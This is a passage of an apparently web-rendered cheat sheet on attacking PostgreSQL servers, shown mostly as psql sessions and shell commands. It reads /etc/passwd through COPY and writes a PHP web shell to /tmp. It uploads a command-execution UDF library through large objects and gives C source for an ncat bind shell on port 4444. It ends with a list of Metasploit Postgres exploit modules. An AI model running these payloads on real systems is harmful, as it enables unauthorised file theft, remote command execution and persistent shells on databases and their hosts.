user to set internal variable<br />  \set [NAME [VALUE]]    set internal variable, or list all if no parameters<br />  \unset NAME            unset (delete) internal variable<br /><br />Large Objects<br />  \lo_export LOBOID FILE<br />  \lo_import FILE [COMMENT]<br />  \lo_list<br />  \lo_unlink LOBOID      large object operations<br /><br />```<br /><br />----<br /><br />###LIST DATABASES###<br /><br />```<br />postgres=# \l<br />                                  List of databases<br />   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   <br />-----------+----------+----------+-------------+-------------+-----------------------<br /> msfdb     | msfuser  | UTF8     | en_US.UTF-8 | en_US.UTF-8 |<br /> postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |<br /> template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +<br />           |          |          |             |             | postgres=CTc/postgres<br /> template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +<br />           |          |          |             |             | postgres=CTc/postgres<br />(4 rows)<br /><br />```<br /><br />----<br /><br />###LIST DATABASE USERS###<br /><br />```<br />postgres=# \du<br />                             List of roles<br /> Role name |                   Attributes                   | Member of<br />-----------+------------------------------------------------+-----------<br /> msfuser   |                                                | {}<br /> postgres  | Superuser, Create role, Create DB, Replication | {}<br /><br />```<br /><br />Please try more details about postgresql database.<br /><br /><br />----<br /><br />##LIST DIRECTORY##<br /><br />```<br />postgres=# select pg_ls_dir('/etc');<br />ERROR:  absolute path not allowed<br />postgres=# select pg_ls_dir('./');<br />      pg_ls_dir       <br />----------------------<br /> postmaster.opts<br /> postmaster.pid<br /> pg_logical<br /> pg_clog<br /> postgresql.auto.conf<br /> pg_hba.conf<br /> cmd.so<br /> pg_multixact<br /> postgresql.conf<br /> pg_ident.conf<br /> global<br /> pg_stat_tmp<br /> PG_VERSION<br /> pg_dynshmem<br /> pg_twophase<br /> pg_xlog<br /> pg_notify<br /> pg_snapshots<br /> pg_tblspc<br /> pg_serial<br /> pg_stat<br /> base<br /> pg_subtrans<br /> pg_replslot<br />(24 rows)<br /><br />```<br /><br />----<br /><br />##READ FILE##<br /><br />**method1**<br /><br />```<br />postgres=# select pg_read_file('postgresql.conf', 0, 200);<br />                pg_read_file                <br />--------------------------------------------<br /> # -----------------------------           +<br /> # PostgreSQL configuration file           +<br /> # -----------------------------           +<br /> #                                         +<br /> # This file consists of lines of the form:+<br /> #                                         +<br /> #   name = value                          +<br /> #                                         +<br /> # (The "=" is optional.)  Whitespace m<br />(1 row)<br /><br />```<br /><br />**method2**<br /><br />```<br />postgres=# drop table pwn;<br />ERROR:  table "pwn" does not exist<br />postgres=# CREATE TABLE pwn(t TEXT);<br />CREATE TABLE<br />postgres=# COPY pwn FROM '/etc/passwd';<br />COPY 27<br />postgres=# SELECT * FROM pwn limit 1 offset 0;<br />                t                <br />---------------------------------<br /> root:x:0:0:root:/root:/bin/bash<br />(1 row)<br /><br />postgres=# SELECT * FROM pwn;<br />                                      t                                       <br />------------------------------------------------------------------------------<br /> root:x:0:0:root:/root:/bin/bash<br /> bin:x:1:1:bin:/bin:/usr/bin/nologin<br /> daemon:x:2:2:daemon:/:/usr/bin/nologin<br /> mail:x:8:12:mail:/var/spool/mail:/usr/bin/nologin<br /> ftp:x:14:11:ftp:/srv/ftp:/usr/bin/nologin<br /> http:x:33:33:http:/srv/http:/usr/bin/nologin<br /> uuidd:x:68:68:uuidd:/:/usr/bin/nologin<br /> dbus:x:81:81:dbus:/:/usr/bin/nologin<br /> nobody:x:99:99:nobody:/:/usr/bin/nologin<br /> systemd-journal-gateway:x:191:191:systemd-journal-gateway:/:/usr/bin/nologin<br /> systemd-timesync:x:192:192:systemd-timesync:/:/usr/bin/nologin<br /> systemd-network:x:193:193:systemd-network:/:/usr/bin/nologin<br /> systemd-bus-proxy:x:194:194:systemd-bus-proxy:/:/usr/bin/nologin<br /> systemd-resolve:x:195:195:systemd-resolve:/:/usr/bin/nologin<br /> systemd-journal-remote:x:999:999:systemd Journal Remote:/:/sbin/nologin<br /> systemd-journal-upload:x:998:998:systemd Journal Upload:/:/sbin/nologin<br /> avahi:x:84:84:avahi:/:/bin/false<br /> polkitd:x:102:102:Policy Kit Daemon:/:/bin/false<br /> git:x:997:997:git daemon user:/:/bin/bash<br /> colord:x:124:124::/var/lib/colord:/bin/false<br /> postgres:x:88:88:PostgreSQL user:/var/lib/postgres:/bin/bash<br /> lab:x:1000:1000::/home/notfound:/bin/bash<br /> stunnel:x:16:16::/var/run/stunnel:/bin/false<br /> dnsmasq:x:996:996:dnsmasq daemon:/:/usr/bin/nologin<br /> mongodb:x:995:2::/var/lib/mongodb:/bin/bash<br /> mysql:x:89:89::/var/lib/mysql:/bin/false<br /> sslh:x:994:994::/:/sbin/nologin<br />(27 rows)<br /><br />postgres=# DROP table pwn;<br /><br />```<br />----<br /><br />##WRITE FILE##<br /><br />```<br />postgres=# DROP TABLE pwn;<br />DROP TABLE<br />postgres=# CREATE TABLE pwn (t TEXT);<br />CREATE TABLE<br />postgres=# INSERT INTO pwn(t) VALUES ('&lt;?php @system("$_GET[cmd]");?&gt;');<br />INSERT 0 1<br />postgres=# SELECT * FROM pwn;<br />               t                <br />--------------------------------<br /> &lt;?php @system("$_GET[cmd]");?&gt;<br />(1 row)<br /><br />postgres=# COPY pwn(t) TO '/tmp/cmd.php';<br />COPY 1<br />postgres=# DROP TABLE pwn;<br />DROP TABLE<br />```<br /><br /><br />----<br /><br />##UDF HACK##<br /><br /><br />###COMPILE SOURCE###<br /><br />```<br />lab: / $ git clone https://github.com/sqlmapproject/udfhack/<br />```<br /><br />```<br />lab: / $ gcc lib_postgresqludf_sys.c -I`pg_config --includedir-server` -fPIC -shared -o udf64.so<br />lab: / $ gcc -Wall -I/usr/include/postgresql/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so<br />lab: / $ strip -sx lib_postgresqludf_sys.so<br />```<br /><br />###COMMAND EXECUTION###<br /><br />transfrom udf.so to hex strings.<br /><br />```<br />lab:~/ $ cat udf.so | hex<br />```<br /><br />upload udf.so with databse features.<br /><br />```<br />postgres=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (19074, 0, decode('079c...', 'hex'));<br />INSERT 0 1<br /><br /><br />postgres=# SELECT lo_export(19074, 'cmd.so');<br />ERROR:  pg_largeobject entry for OID 19074, page 0 has invalid data field size 3213<br />postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';<br />        setting         <br />------------------------<br /> /var/lib/postgres/data<br />(1 row)<br />```<br /><br />Library is too large, and we need to split it to some pieces.  Please read https://github.com/sqlmapproject/sqlmap/issues/1170.<br /><br />```<br />postgres=# select * from pg_largeobject;<br /> loid | pageno | data<br />------+--------+------<br />(0 rows)<br /><br />postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';<br />        setting         <br />------------------------<br /> /var/lib/postgres/data<br />(1 row)<br /><br />postgres=# SELECT lo_creat(-1);<br /> lo_creat<br />----------<br />    19075<br />(1 row)<br /><br />postgres=# SELECT lo_create(11122);<br /> lo_create<br />-----------<br />     11122<br />(1 row)<br /><br />postgres=# select * from pg_largeobject;<br /> loid | pageno | data<br />------+--------+------<br />(0 rows)<br /><br />postgres=# INSERT INTO pg_largeobject VALUES (11122, 0, decode('079c...', 'hex'));<br />INSERT 0 1<br />postgres=# INSERT INTO pg_largeobject VALUES (11122, 1, decode('a28e...', 'hex'));<br />INSERT 0 1<br />postgres=# INSERT INTO pg_largeobject VALUES (11122, 2, decode('1265...', 'hex'));<br />INSERT 0 1<br />postgres=# INSERT INTO pg_largeobject VALUES (11122, 3, decode('c62e...', 'hex'));<br />INSERT 0 1<br />postgres=# SELECT lo_export(11122, '/tmp/cmd.so');<br /> lo_export<br />-----------<br />         1<br />(1 row)<br /><br />postgres=# SELECT lo_unlink(11122);<br /> lo_unlink<br />-----------<br />         1<br />(1 row)<br /><br />```<br />upload library successfully, and then create Postgresql FUNCTION.<br /><br />```<br />postgres=# CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/udf64.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;<br />CREATE FUNCTION<br />postgres=# CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/udf64.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;<br />CREATE FUNCTION<br />```<br /><br />Execute commands with **sys\_exec**, and nothing returns.<br /><br />```<br />postgres=# SELECT sys_exec('id');<br /> sys_exec<br />----------<br />        0<br />(1 row)<br />```<br /><br />Please clear functions after commands execution.<br /><br />```<br />postgres=# DROP FUNCTION sys_exec(text);<br />DROP FUNCTION<br />postgres=# DROP FUNCTION sys_eval(text);<br />DROP FUNCTION<br /><br />```<br /><br />###BIND SHELL###<br /><br />```<br />// bind shell on port 4444<br />#include "postgres.h"<br />#include "fmgr.h"<br />#include &lt;stdlib.h&gt;<br /><br />#ifdef PG_MODULE_MAGIC<br />PG_MODULE_MAGIC;<br />#endif<br /><br />text *exec()<br />{<br />    system("ncat -e /bin/bash -l -p 4444");<br />}<br /><br />```<br />compile source code,<br /><br />```<br />lab:postgres_cmd/ $  vim nc.c<br />lab:postgres_cmd/ $  gcc nc.c -I`pg_config --includedir-server` -fPIC -shared -o nc.so<br />lab:postgres_cmd/ $  strip -sx nc.so<br />```<br /><br />copy nc.so to postgresql tmp path, or you can upload so file with database features.<br /><br />```<br />lab:postgres_cmd/ $  sudo cp nc.so /tmp/systemd-private-374c1bd49d5f425ca21cca8cc6d89de7-postgresql.service-SKrVjI/tmp/nc.so<br />```<br /><br />create FUNCTION exec for bind shell. And client connects to target.<br /><br />```<br />postgres=# CREATE OR REPLACE FUNCTION exec() RETURNS text AS  '/tmp/nc.so', 'exec' LANGUAGE C STRICT;<br />CREATE FUNCTION<br />postgres=# SELECT exec();<br />server closed the connection unexpectedly<br />    This probably means the server terminated abnormally<br />    before or while processing the request.<br />The connection to the server was lost. Attempting reset: Failed.<br /><br />```<br /><br />----<br /><br /><br />##METASPLOIT POSTGRESQL MODULES##<br /><br />```<br />use auxiliary/admin/postgres/postgres_readfile<br />use auxiliary/admin/postgres/postgres_sql<br />use auxiliary/scanner/postgres/postgres_dbname_flag_injection<br />use auxiliary/scanner/postgres/postgres_login<br />use auxiliary/scanner/postgres/postgres_version<br />use auxiliary/server/capture/postgresql<br />use exploit/linux/postgres/postgres_payload<br />use exploit/windows/postgres/postgres_payload<br />```<br /><br /><br /><br />#REFERENCES#<br /><br />https://github.com/sqlmapproject/udfhack/  <br />https://github.com/sqlmapproject/sqlmap/issues/1170   <br />http://zone.wooyun.org/content/4971  <br />http://drops.wooyun.org/tips/6449  <br />http://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html  <br /><br /><br /><br /></div></div>
</body></html>